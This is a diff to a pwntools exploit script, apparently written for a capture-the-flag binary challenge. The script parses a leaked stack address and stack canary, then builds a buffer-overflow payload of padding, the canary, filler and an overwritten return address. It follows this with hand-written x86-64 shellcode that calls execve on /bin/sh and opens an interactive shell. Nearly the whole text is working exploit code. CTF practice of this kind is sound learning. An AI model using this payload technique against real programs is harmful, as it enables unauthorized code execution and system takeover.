@@ -23,7 +23,8 @@ syscall
 shellcode = asm(shellcraft.amd64.linux.sh())
 '''
 
-
+s = 'b * UwU_main+404'
+gdb.attach(p, s)
 
 #output = p.recvuntil(b"0x")
 p.recvuntil(b"0x")
@@ -36,8 +37,18 @@ UwU_addr = int(b'0x' + p.recvuntil(b' ', drop = True), 16)
 p.recvuntil(b"0x")
 canary = int(b'0x' + p.recvuntil(b' ', drop = True), 16)
 
-shellcode = asm(shellcraft.amd64.linux.sh())
-shellcode_addr = UwU_addr + 0x18 + 24
+#shellcode = asm(shellcraft.amd64.linux.sh())
+shellcode = asm("""
+mov rax, 0x68732f6e69622f
+push rax
+mov rdi, rsp
+xor rsi, rsi
+xor rdx, rdx
+mov rax, 0x3b
+syscall
+""")   
+shellcode_addr = UwU_addr + 0x18 + 24 # first set to the start of the remaining 16 bytes after return address
+
 payload = b'A' * 24 # to where the canary is 
 payload += p64(canary) # up to rbp now
 payload += b'B' * 8 # 8 more bytes to the return address 
@@ -45,10 +56,11 @@ payload += p64(shellcode_addr) # overwritting return address
 
 # sehllcode placed after return address 
 payload += shellcode
-pause()
+
+
+
 p.recvuntil(b"you pass!")
 p.sendline(payload)
-pause()
 p.interactive()
 
 
